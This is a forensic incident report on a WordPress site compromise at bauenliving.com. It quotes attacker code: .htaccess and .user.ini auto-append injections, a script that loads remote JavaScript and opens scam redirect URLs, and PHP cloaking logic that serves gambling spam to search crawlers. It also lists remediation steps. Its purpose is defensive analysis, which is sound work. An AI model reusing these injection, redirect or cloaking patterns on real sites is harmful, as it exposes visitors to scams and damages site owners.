Executive Summary

v3 — Full Scan Complete — Three Simultaneous Attack Vectors Confirmed A comprehensive server-wide forensic scan has revealed this is not a single malware infection but a three-vector attack carried out by the same threat actor across two waves.

Vector 1 — Popup Redirect (pd-inject v5): Malware auto-appended to every PHP response on vt.bauenliving.com, displaying a fake "⚠️ Notice" popup that redirects visitors to scam sites via the chain scarleterror.com → corevibe-network.com → telkucton.org.

Vector 2 — SEO Spam Cloaking: A 448KB PHP cloaking script at vt.bauenliving.com/video/index.php generates Thai gambling/slot machine pages (PG Slot affiliate spam), detects Googlebot to show different content to crawlers versus users, and serves a spam sitemap listing hundreds of gambling keyword URLs under bauenliving.com.

Vector 3 — Google Search Console Hijack: The attacker added bauenliving.com to their own Google Search Console account using 5 different verification HTML files found across the server. This gave them the ability to submit spam sitemaps directly to Google, request spam page indexing, and potentially remove legitimate pages.

Wave 1 (28 May 2026, 20:04 ICT): Initial breach via distributed brute force. Malware injected into privacy-tools.php, Fusion Builder, and 12+ Really Simple SSL HTML files. SEO spam directories and Google verification files were also planted at this time.

Wave 2 (7 June 2026, 01:59 ICT): Attacker returned 10 days later, deployed the persistent pd-inject v5 popup kit on vt.bauenliving.com. Ran undetected for 16 days.

Total active period: 26 days (28 May – 23 June 2026).

Business Impact

  • Brand damage: Visitors to bauenliving.com and vt.bauenliving.com were shown a fake system alert popup and redirected to adult/scam content, directly damaging trust in the BAUEN by SCG brand.
  • Google deindexing risk (CRITICAL): The attacker planted gambling spam pages under bauenliving.com's domain and submitted them to Google via a hijacked Search Console account. If Google has already indexed these spam pages, bauenliving.com may receive a Google Manual Action penalty, which can remove the entire site from search results. This is potentially the most damaging long-term consequence of the attack.
  • Google Search Console hijacked: The attacker verified ownership of bauenliving.com in their own GSC account using 5 verification HTML files. They may have already submitted spam sitemaps and requested indexing of gambling pages. Unauthorized GSC access must be revoked immediately.
  • Data privacy (PDPA): The malware tracked visitor IP addresses and referrer URLs in an attacker-controlled log file, constituting unauthorized personal data collection. 17 confirmed victims — legal counsel should assess PDPA notification obligations.
  • Duration of exposure: 26 days total (28 May – 23 June 2026). Popup redirect active 16 days. SEO spam pages potentially crawled by Google during this entire period.
  • Possible data exfiltration: A 290MB zip archive of all WordPress plugins (plugins.zip) was created on the server 2 days after the initial breach. This may represent an attacker packaging plugin source code for further exploitation.

Root Cause Analysis

Root Cause — Confirmed (Two Waves) Both attacks were made possible by a successful distributed brute-force of the WordPress login page. The limit-login-attempts-reloaded plugin was installed but failed to block either attack because the attacker used 50+ different IP addresses per wave (distributed botnet), rotating through them to stay under any single-IP lockout threshold. After Wave 1 was partially cleaned, the attacker simply repeated the same brute-force method 10 days later (Wave 2), confirming the root password was either not changed or was re-cracked.

How the Malware Works

Stage 1 — PHP Auto-Append via .htaccess + .user.ini

# Attacker inserted into vt.bauenliving.com/.htaccess: # PD-INJ-START <IfModule mod_php8.c> php_value auto_append_file "/var/www/vhosts/bauenliving.com/vt.bauenliving.com/ads.php" </IfModule> # PD-INJ-END # Also in .user.ini (PHP CGI/FPM override): auto_append_file = "/var/www/vhosts/bauenliving.com/vt.bauenliving.com/ads.php"

Stage 2 — ads.php injects script tag into every HTML response

// ads.php — pd-inject v5 — appended to EVERY PHP page response: echo '<!-- pd-inj v5 -->'; echo '<script src="/ads.js"></script>';

Stage 3 — ads.js shows fake "Notice" popup, redirects to scam network

/* pd-fakeclose — creates fake "⚠️ Notice" overlay */ var U = "https://scarleterror.com/ivigjntj?key=..." /* When visitor clicks "Close" button → opens scam URL in new tab */ window.open(U, "_blank"); /* pd-rotator — loads additional malware from external server */ var s = ["https://scarleterror.com/61/87/2c/61872c...js"] /* Loads chain: scarleterror.com → corevibe-network.com → telkucton.org */

SEO Spam Cloaking Attack — Technical Detail

The video/index.php script uses the following cloaking logic to evade detection while serving spam pages to Google:

// Step 1: Detect Googlebot — show spam content to crawler, 404 to humans without keyword $paramFile = __DIR__ . '/param.txt'; // reads "website" as valid GET key $validKeys = explode(' ', file_get_contents($paramFile)); // Step 2: If ?website= key missing → show 404 (real user sees nothing) if ($key === null) { echo '404'; die; } // Step 3: With ?website=pg+slot → generate full Thai gambling page $brand = $_GET[$key]; // e.g. "pg slot" $signUp = 'https://kutt.arrehlah.com/alexsagapung'; // gambling affiliate link $title = "ทำไม PG Slot ถึงเป็นค่ายเกมสล็อตอันดับ 1 ในปี 2025?"; // Step 4: ?website=sitemap.xml → returns spam XML sitemap to Google // Sitemap contains URLs: bauenliving.com/video/pg+slot, bauenliving.com/video/k929 ... if ($brand == 'sitemap.xml') { header('Content-Type: application/xml'); // Returns 29a.xml — 3.1MB sitemap of hundreds of gambling keyword URLs }

Impact: If the attacker submitted this sitemap URL to Google Search Console, Google may have indexed gambling pages with bauenliving.com's domain and authority, making the domain appear as a gambling spam site and triggering a Google manual penalty.

Google Search Console Hijack — How It Works

The attacker placed 5 unique Google-format HTML verification files on the server. When Google visits bauenliving.com/googleXXXXXX.html, it returns the verification token, confirming to Google that the file requester owns the domain. This grants the attacker:

  • Full read access to all GSC data for bauenliving.com (search traffic, crawl errors, indexed pages)
  • Ability to submit sitemaps — attacker can direct Google to index the 29a.xml gambling spam sitemap
  • Ability to request removal of legitimate pages from Google index
  • The verification files must be deleted AND the attacker's GSC account must be manually removed from the property owners list at search.google.com/search-console

Recommended Actions

P1 Immediate
Remove all malware files from vt.bauenliving.com

Delete ads.php, ads.js, .ads.log. Remove injected blocks from .htaccess and .user.ini. Clean injected script tag from updraft/index.html. Delete the video/ directory entirely (index.php, param.txt, thaikeyword.txt, Google verification HTML). Delete the entire .trash/ folder. This stops the active redirect and SEO spam serving immediately.

P1 Immediate
Revoke Attacker's Google Search Console Access

Log in to search.google.com/search-console → Select the bauenliving.com property → Settings → Users and permissions. Remove any unrecognized users/owners. The 5 verification files on the server mean the attacker claimed owner-level access. After revoking access, check the Sitemaps report for any spam sitemaps submitted and remove them. Also check the Coverage report for any gambling pages that may have been indexed. Failure to revoke GSC access means the attacker retains the ability to manipulate your Google search presence even after the server files are cleaned.

P1 Immediate
Reset ALL WordPress admin passwords

All 7 administrator accounts must have their passwords changed to a randomly generated 20+ character password. The attacker successfully brute-forced at least one account and may have added backdoor credentials.

P1 Immediate
Enable Two-Factor Authentication (2FA) on WordPress

Install the "WP 2FA" plugin. Require 2FA for all administrator and editor accounts. A brute-forced password alone will not be sufficient to gain access with 2FA enabled.

P2 This Week
Request Google Spam URL Removal & Monitor for Manual Action

After deleting the spam files, use Google Search Console → Removals to submit the spam sitemap URL for removal. Check the Manual Actions report for any penalties already issued. Search Google for site:bauenliving.com casino or site:bauenliving.com slot to discover any already-indexed gambling pages. If a manual action has been issued, submit a reconsideration request after cleanup is complete.

P2 This Week
Delete plugins.zip (Possible Data Exfiltration Archive)

The 290MB file at httpdocs/wp-content/plugins.zip, created 2 days after the initial breach, should be deleted. Verify with the development team whether this file was intentionally created by a legitimate admin — if not, treat it as attacker-created and delete it. A public-facing 290MB zip of plugin source code is also a security risk in itself.

P2 This Week
Block wp-login.php with IP Allowlist or Cloudflare WAF

Restrict access to /wp-login.php to known office/VPN IP addresses via .htaccess, or deploy Cloudflare in front of the site and enable their Bot Fight Mode and WAF rule for WordPress login protection.

P2 This Week
Change Plesk/SSH credentials for the "bauen" system user

The server SSH credentials were used in this investigation. Rotate the Plesk system user password and generate new SSH key pairs. The attacker had access to the WP admin but may have also attempted server-level access.

P2 This Week
Assess PDPA Notification Obligation

17 visitor IP addresses and referrer URLs were captured by the attacker. Under Thailand PDPA, the organization should consult legal counsel on whether a data breach notification is required to the PDPC and to affected individuals.

P3 This Month
Deploy File Integrity Monitoring

Configure Plesk's built-in "Website Security" (Imunify360) or install Wordfence to alert on any new/modified files in the web root. The 16-day detection gap would be reduced to hours.

P3 This Month
Submit Site for Google Safe Browsing & Security Review

After cleanup: (1) Check Google Safe Browsing status at transparencyreport.google.com/safe-browsing/search. (2) In GSC, go to Security Issues and request a review to clear any malware flag. (3) Verify the Manual Actions section is clear; if not, file a reconsideration request. (4) Confirm all spam URLs are deindexed by checking site:bauenliving.com in Google Search within 2–4 weeks of cleanup.

P4 Ongoing
Reduce WordPress Admin Account Count

7 active Administrator accounts were found. Principle of least privilege: reduce to 2–3 administrators maximum. Editors should not have Administrator role. Review all accounts and reassign roles appropriately.
